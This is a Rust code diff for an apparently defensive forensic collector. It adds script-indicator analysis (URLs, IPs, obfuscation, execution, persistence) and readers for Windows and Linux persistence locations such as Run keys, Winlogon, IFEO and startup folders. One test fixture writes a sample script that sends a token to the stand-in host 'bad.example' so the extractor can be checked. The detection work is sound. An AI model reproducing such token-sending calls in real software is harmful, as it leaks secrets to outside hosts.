@@ -1249,6 +1249,114 @@ impl CapabilityRegistry {
                 privilege: PrivilegeLevel::User,
                 evidence_contract: "script_python",
             },
+            RuntimeCapabilityBinding {
+                capability_id: "script.powershell.metadata",
+                runtime_module: "jockey_runtime_artifacts",
+                runtime_handler: "analyze_powershell_scripts",
+                abi_symbol: Some("jockey_rt_invoke_capability"),
+                platform: Platform::Windows,
+                privilege: PrivilegeLevel::User,
+                evidence_contract: "script_powershell_metadata",
+            },
+            RuntimeCapabilityBinding {
+                capability_id: "script.bash.metadata",
+                runtime_module: "jockey_runtime_artifacts",
+                runtime_handler: "analyze_shell_scripts",
+                abi_symbol: Some("jockey_rt_invoke_capability"),
+                platform: Platform::Linux,
+                privilege: PrivilegeLevel::User,
+                evidence_contract: "script_bash_metadata",
+            },
+            RuntimeCapabilityBinding {
+                capability_id: "script.python.metadata",
+                runtime_module: "jockey_runtime_artifacts",
+                runtime_handler: "analyze_python_scripts",
+                abi_symbol: Some("jockey_rt_invoke_capability"),
+                platform: Platform::Both,
+                privilege: PrivilegeLevel::User,
+                evidence_contract: "script_python_metadata",
+            },
+            RuntimeCapabilityBinding {
+                capability_id: "script.javascript.metadata",
+                runtime_module: "jockey_runtime_artifacts",
+                runtime_handler: "analyze_javascript_scripts",
+                abi_symbol: Some("jockey_rt_invoke_capability"),
+                platform: Platform::Both,
+                privilege: PrivilegeLevel::User,
+                evidence_contract: "script_javascript_metadata",
+            },
+            RuntimeCapabilityBinding {
+                capability_id: "script.cmd.metadata",
+                runtime_module: "jockey_runtime_artifacts",
+                runtime_handler: "analyze_batch_scripts",
+                abi_symbol: Some("jockey_rt_invoke_capability"),
+                platform: Platform::Windows,
+                privilege: PrivilegeLevel::User,
+                evidence_contract: "script_cmd_metadata",
+            },
+            RuntimeCapabilityBinding {
+                capability_id: "script.url.indicators",
+                runtime_module: "jockey_runtime_artifacts",
+                runtime_handler: "analyze_all_scripts",
+                abi_symbol: Some("jockey_rt_invoke_capability"),
+                platform: Platform::Both,
+                privilege: PrivilegeLevel::User,
+                evidence_contract: "script_url_indicators",
+            },
+            RuntimeCapabilityBinding {
+                capability_id: "script.ip.indicators",
+                runtime_module: "jockey_runtime_artifacts",
+                runtime_handler: "analyze_all_scripts",
+                abi_symbol: Some("jockey_rt_invoke_capability"),
+                platform: Platform::Both,
+                privilege: PrivilegeLevel::User,
+                evidence_contract: "script_ip_indicators",
+            },
+            RuntimeCapabilityBinding {
+                capability_id: "script.file.indicators",
+                runtime_module: "jockey_runtime_artifacts",
+                runtime_handler: "analyze_all_scripts",
+                abi_symbol: Some("jockey_rt_invoke_capability"),
+                platform: Platform::Both,
+                privilege: PrivilegeLevel::User,
+                evidence_contract: "script_file_indicators",
+            },
+            RuntimeCapabilityBinding {
+                capability_id: "script.environment.indicators",
+                runtime_module: "jockey_runtime_artifacts",
+                runtime_handler: "analyze_all_scripts",
+                abi_symbol: Some("jockey_rt_invoke_capability"),
+                platform: Platform::Both,
+                privilege: PrivilegeLevel::User,
+                evidence_contract: "script_environment_indicators",
+            },
+            RuntimeCapabilityBinding {
+                capability_id: "script.obfuscation",
+                runtime_module: "jockey_runtime_artifacts",
+                runtime_handler: "analyze_all_scripts",
+                abi_symbol: Some("jockey_rt_invoke_capability"),
+                platform: Platform::Both,
+                privilege: PrivilegeLevel::User,
+                evidence_contract: "script_obfuscation_indicators",
+            },
+            RuntimeCapabilityBinding {
+                capability_id: "script.execution",
+                runtime_module: "jockey_runtime_artifacts",
+                runtime_handler: "analyze_all_scripts",
+                abi_symbol: Some("jockey_rt_invoke_capability"),
+                platform: Platform::Both,
+                privilege: PrivilegeLevel::User,
+                evidence_contract: "script_execution_indicators",
+            },
+            RuntimeCapabilityBinding {
+                capability_id: "script.persistence",
+                runtime_module: "jockey_runtime_artifacts",
+                runtime_handler: "analyze_all_scripts",
+                abi_symbol: Some("jockey_rt_invoke_capability"),
+                platform: Platform::Both,
+                privilege: PrivilegeLevel::User,
+                evidence_contract: "script_persistence_indicators",
+            },
 
             // File/Binary Metadata capabilities
             RuntimeCapabilityBinding {
@@ -1256,7 +1364,7 @@ impl CapabilityRegistry {
                 runtime_module: "jockey_runtime_artifacts",
                 runtime_handler: "parse_pe_metadata",
                 abi_symbol: Some("jockey_rt_collect_artifacts"),
-                platform: Platform::Windows,
+                platform: Platform::Both,
                 privilege: PrivilegeLevel::User,
                 evidence_contract: "file_pe_metadata",
             },
@@ -1265,7 +1373,7 @@ impl CapabilityRegistry {
                 runtime_module: "jockey_runtime_artifacts",
                 runtime_handler: "parse_pe_metadata",
                 abi_symbol: Some("jockey_rt_invoke_capability"),
-                platform: Platform::Windows,
+                platform: Platform::Both,
                 privilege: PrivilegeLevel::User,
                 evidence_contract: "file_pe_metadata",
             },
@@ -3244,18 +3352,33 @@ impl CapabilityRegistry {
                 }).map(str::to_ascii_lowercase).find(|status| matches!(
                     status.as_str(),
                     "not_implemented" | "unsupported" | "platform_note" | "path_not_found"
-                        | "not_found" | "permission_denied" | "partial" | "failed"
+                        | "not_found" | "no_paths_found" | "not_available" | "unavailable"
+                        | "unknown_type" | "permission_denied" | "partial" | "failed"
+                        | "parse_error" | "read_error"
                 ));
                 let status = match marker_status.as_deref() {
                     Some("not_implemented" | "unsupported" | "platform_note") => CollectionStatus::Unsupported,
-                    Some("path_not_found" | "not_found") => CollectionStatus::NotFound,
+                    Some("unavailable" | "unknown_type") => CollectionStatus::Unsupported,
+                    Some("path_not_found" | "not_found" | "no_paths_found" | "not_available") => CollectionStatus::NotFound,
                     Some("permission_denied") => CollectionStatus::PermissionDenied,
-                    Some("partial") => CollectionStatus::Partial,
+                    Some("partial" | "parse_error" | "read_error") => CollectionStatus::Partial,
                     Some("failed") => CollectionStatus::Failed,
                     _ => CollectionStatus::Success,
                 };
                 let warning = (status == CollectionStatus::Partial || status == CollectionStatus::Unsupported)
                     .then(|| format!("Collector returned status {}", marker_status.as_deref().unwrap_or("unknown")));
+                Ok((status, count, records, None, warning))
+            }};
+        }
+
+        macro_rules! append_records_with_errors {
+            ($records:expr, $errors:expr) => {{
+                let records: Vec<serde_json::Value> = $records;
+                let errors: Vec<String> = $errors;
+                let count = records.len();
+                collector.data_mut().extend(records.iter().cloned());
+                let warning = (!errors.is_empty()).then(|| errors.join("; "));
+                let status = if warning.is_some() { CollectionStatus::Partial } else { CollectionStatus::Success };
                 Ok((status, count, records, None, warning))
             }};
         }
@@ -3345,43 +3468,47 @@ impl CapabilityRegistry {
                         "data": serde_json::to_value(group).map_err(|e| e.to_string())?,
                     }));
                 }
-                append_records!(records)
+                append_records_with_errors!(records, result.errors)
             }
 
             // Auth handlers
             "collect_logon_events" => {
                 let result = jockey_runtime_auth::collect_logon_events()
                     .map_err(|e| e.to_string())?;
+                let errors = result.errors;
                 let records = result.events.into_iter()
                     .map(|event| serde_json::to_value(event).map_err(|e| e.to_string()))
                     .collect::<Result<Vec<_>, _>>()?;
-                append_records!(records)
+                append_records_with_errors!(records, errors)
             }
             "collect_credential_artifacts" => {
                 let result = jockey_runtime_auth::collect_credential_artifacts()
                     .map_err(|e| e.to_string())?;
+                let errors = result.errors;
                 let records = result.artifacts.into_iter()
                     .map(|artifact| serde_json::to_value(artifact).map_err(|e| e.to_string()))
                     .collect::<Result<Vec<_>, _>>()?;
-                append_records!(records)
+                append_records_with_errors!(records, errors)
             }
             "collect_auth_policy" => {
                 let result = jockey_runtime_auth::collect_auth_policy()
                     .map_err(|e| e.to_string())?;
+                let errors = result.errors;
                 let records = result.policies.into_iter()
                     .map(|policy| serde_json::to_value(policy).map_err(|e| e.to_string()))
                     .collect::<Result<Vec<_>, _>>()?;
-                append_records!(records)
+                append_records_with_errors!(records, errors)
             }
 
             // Service handlers
             "enumerate_services" => {
                 let result = jockey_runtime_services::enumerate_services()
                     .map_err(|e| e.to_string())?;
+                let errors = result.errors;
                 let records = result.services.into_iter()
                     .map(|service| serde_json::to_value(service).map_err(|e| e.to_string()))
                     .collect::<Result<Vec<_>, _>>()?;
-                append_records!(records)
+                append_records_with_errors!(records, errors)
             }
             "enumerate_drivers" => {
                 collector.collect_drivers()
@@ -3477,12 +3604,51 @@ impl CapabilityRegistry {
             "analyze_wmi_scripts" => append_records!(jockey_runtime_artifacts::analyze_wmi_scripts(&option_string("path", ".")).map_err(|e| e.to_string())?),
             "analyze_shell_scripts" => append_records!(jockey_runtime_artifacts::analyze_shell_scripts(&option_string("path", ".")).map_err(|e| e.to_string())?),
             "analyze_python_scripts" => append_records!(jockey_runtime_artifacts::analyze_python_scripts(&option_string("path", ".")).map_err(|e| e.to_string())?),
+            "analyze_javascript_scripts" => append_records!(jockey_runtime_artifacts::analyze_javascript_scripts(&option_string("path", ".")).map_err(|e| e.to_string())?),
+            "analyze_batch_scripts" => append_records!(jockey_runtime_artifacts::analyze_batch_scripts(&option_string("path", ".")).map_err(|e| e.to_string())?),
+            "analyze_all_scripts" => {
+                let records = jockey_runtime_artifacts::analyze_all_script_files(&option_string("path", "."))
+                    .map_err(|e| e.to_string())?;
+                let (field, behavior) = match capability.id.as_str() {
+                    "script.url.indicators" => (Some("urls"), None),
+                    "script.ip.indicators" => (Some("ip_addresses"), None),
+                    "script.file.indicators" => (Some("file_or_registry_paths"), None),
+                    "script.environment.indicators" => (Some("environment_variables"), None),
+                    "script.obfuscation" => (Some("encoded_strings"), Some("obfuscation")),
+                    "script.execution" => (None, Some("execution")),
+                    "script.persistence" => (None, Some("persistence")),
+                    _ => return Err(format!("No indicator projection for {}", capability.id)),
+                };
+                let projected = records.into_iter().filter_map(|record| {
+                    let analysis = record.get("static_analysis")?;
+                    let values = if let Some(field) = field {
+                        analysis.get(field)?.as_array()?.clone()
+                    } else {
+                        let matches = analysis.get("behavior_indicators")?.as_array()?;
+                        if !matches.iter().any(|value| value.as_str() == behavior) {
+                            return None;
+                        }
+                        matches.clone()
+                    };
+                    if values.is_empty() { return None; }
+                    Some(serde_json::json!({
+                        "artifact_type": record.get("artifact_type"),
+                        "path": record.get("path"),
+                        "sha256": record.get("sha256"),
+                        "indicator_type": capability.id,
+                        "indicators": values,
+                    }))
+                }).collect::<Vec<_>>();
+                append_records!(projected)
+            }
             "parse_pe_metadata" => append_records!(jockey_runtime_artifacts::parse_pe_metadata(&option_string("path", ".")).map_err(|e| e.to_string())?),
             "parse_elf_metadata" => append_records!(jockey_runtime_artifacts::parse_elf_metadata(&option_string("path", ".")).map_err(|e| e.to_string())?),
             "verify_code_signature" => append_records!(jockey_runtime_artifacts::verify_code_signature(&option_string("path", ".")).map_err(|e| e.to_string())?),
             "analyze_file_entropy" => append_records!(jockey_runtime_artifacts::analyze_file_entropy(&option_string("path", ".")).map_err(|e| e.to_string())?),
             "detect_binary_anomalies" => append_records!(jockey_runtime_artifacts::detect_binary_anomalies(&option_string("path", ".")).map_err(|e| e.to_string())?),
             "detect_rootkit_indicators" => append_records!(jockey_runtime_security::detect_rootkit_indicators(&option_string("path", ".")).map_err(|e| e.to_string())?),
+            "enumerate_scheduled_tasks" => append_records!(jockey_runtime_artifacts::collect_windows_scheduled_tasks().map_err(|e| e.to_string())?),
+            "enumerate_wmi_subscriptions" => append_records!(jockey_runtime_artifacts::collect_windows_wmi_subscriptions().map_err(|e| e.to_string())?),
             "hash_sha256" => {
                 if capability.id.starts_with("file.") {
                     let path = option_string("path", "");
@@ -3523,12 +3689,57 @@ impl CapabilityRegistry {
                 append_records!(collector.data().to_vec())
             }
             "collect_autostart_entries" => {
+                if matches!(capability.id.as_str(), "persistence.run" | "persistence.winlogon" | "persistence.ifeo" | "persistence.appinit") {
+                    if !cfg!(target_os = "windows") {
+                        return Err(format!("Unsupported platform for {}", capability.id));
+                    }
+                    let keys: Vec<(&str, &str)> = match capability.id.as_str() {
+                        "persistence.run" => vec![
+                            ("HKCU", r"Software\Microsoft\Windows\CurrentVersion\Run"),
+                            ("HKCU", r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
+                            ("HKLM", r"Software\Microsoft\Windows\CurrentVersion\Run"),
+                            ("HKLM", r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
+                        ],
+                        "persistence.winlogon" => vec![("HKLM", r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon")],
+                        "persistence.ifeo" => vec![("HKLM", r"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options")],
+                        "persistence.appinit" => vec![("HKLM", r"Software\Microsoft\Windows NT\CurrentVersion\Windows")],
+                        _ => unreachable!(),
+                    };
+                    let mut failed = false;
+                    for (hive, key) in keys {
+                        if collector.collect_registry(hive, key).is_err() {
+                            failed = true;
+                        }
+                    }
+                    let records = collector.data().to_vec();
+                    if failed && records.is_empty() {
+                        return Err("Permission denied or registry key unavailable".to_string());
+                    }
+                    let count = records.len();
+                    let status = if failed { CollectionStatus::Partial } else { CollectionStatus::Success };
+                    let warning = failed.then(|| "One or more registry keys could not be read".to_string());
+                    return Ok((status, count, records, None, warning));
+                }
                 let records = match capability.id.as_str() {
                     "persistence.autostart" => jockey_runtime_artifacts::collect_autostart_entries(None),
                     "persistence.cron" => jockey_runtime_artifacts::carve_cron_entries(""),
                     "persistence.systemd.timer" => jockey_runtime_artifacts::carve_systemd_units("").map(|units| units.into_iter().filter(|unit| unit.get("metadata").and_then(|m| m.get("unit_type")).and_then(serde_json::Value::as_str) == Some("timer")).collect()),
                     "persistence.ssh" => jockey_runtime_artifacts::carve_ssh_config("/etc/ssh"),
+                    "persistence.shell.profile" => jockey_runtime_artifacts::collect_shell_profiles(None),
+                    "persistence.startup.folder" if cfg!(target_os = "linux") => jockey_runtime_artifacts::collect_xdg_autostart_entries(None),
+                    "persistence.startup.folder" if cfg!(target_os = "windows") => {
+                        let mut startup_records = Vec::new();
+                        for directory in [
+                            std::env::var("APPDATA").ok().map(|root| format!(r"{}\Microsoft\Windows\Start Menu\Programs\Startup", root)),
+                            std::env::var("PROGRAMDATA").ok().map(|root| format!(r"{}\Microsoft\Windows\Start Menu\Programs\Startup", root)),
+                        ].into_iter().flatten() {
+                            startup_records.extend(jockey_runtime_artifacts::carve_lnk_files(&directory).map_err(|e| e.to_string())?);
+                        }
+                        Ok(startup_records)
+                    }
                     "persistence.scheduled.task" | "persistence.scheduled_tasks" if cfg!(target_os = "linux") => jockey_runtime_artifacts::carve_cron_entries(""),
+                    "persistence.scheduled.task" | "persistence.scheduled_tasks" if cfg!(target_os = "windows") => jockey_runtime_artifacts::collect_windows_scheduled_tasks(),
+                    "persistence.wmi" => jockey_runtime_artifacts::collect_windows_wmi_subscriptions(),
                     _ => return Err(format!("No mechanism-specific persistence collector is implemented for {}", capability.id)),
                 }.map_err(|e| e.to_string())?;
                 append_records!(records)
@@ -3895,5 +4106,43 @@ mod tests {
         assert_eq!(merkle_result.status, CollectionStatus::Success);
         assert_eq!(merkle_result.evidence_records[0]["record_count"], 2);
         assert_eq!(merkle_result.evidence_records[0]["merkle_root"].as_str().unwrap().len(), 64);
+    }
+
+    #[cfg(target_os = "linux")]
+    #[test]
+    fn test_persistence_capabilities_keep_mechanism_specific_records() {
+        let shell_profiles = registry().invoke_runtime_capability("persistence.shell.profile").unwrap();
+        let startup_folder = registry().invoke_runtime_capability("persistence.startup.folder").unwrap();
+
+        assert_eq!(shell_profiles.status, CollectionStatus::Success);
+        assert_eq!(startup_folder.status, CollectionStatus::Success);
+        assert!(shell_profiles.evidence_records.iter().any(|record| {
+            record.get("artifact_type").and_then(serde_json::Value::as_str) == Some("shell_profile")
+                || record.get("status").and_then(serde_json::Value::as_str) == Some("no_artifacts_found")
+        }));
+        assert!(startup_folder.evidence_records.iter().any(|record| {
+            record.get("artifact_type").and_then(serde_json::Value::as_str) == Some("xdg_autostart")
+                || record.get("status").and_then(serde_json::Value::as_str) == Some("no_artifacts_found")
+        }));
+    }
+
+    #[test]
+    fn test_script_url_capability_returns_url_projection() {
+        let root = std::env::temp_dir().join(format!("jockey-script-url-{}", std::process::id()));
+        std::fs::create_dir_all(&root).unwrap();
+        std::fs::write(root.join("sample.py"), "import requests\nrequests.get('https://bad.example/path?token=hidden')\n").unwrap();
+        let mut options = serde_json::Map::new();
+        options.insert("path".to_string(), serde_json::json!(root));
+
+        let result = registry()
+            .invoke_runtime_capability_with_options("script.url.indicators", &options)
+            .unwrap();
+        let _ = std::fs::remove_dir_all(options["path"].as_str().unwrap());
+
+        assert_eq!(result.status, CollectionStatus::Success);
+        assert_eq!(result.records_count, 1);
+        assert_eq!(result.evidence_records[0]["indicator_type"], "script.url.indicators");
+        assert_eq!(result.evidence_records[0]["indicators"][0], "https://bad.example/path");
+        assert!(!result.evidence_records[0].to_string().contains("token=hidden"));
     }
 }
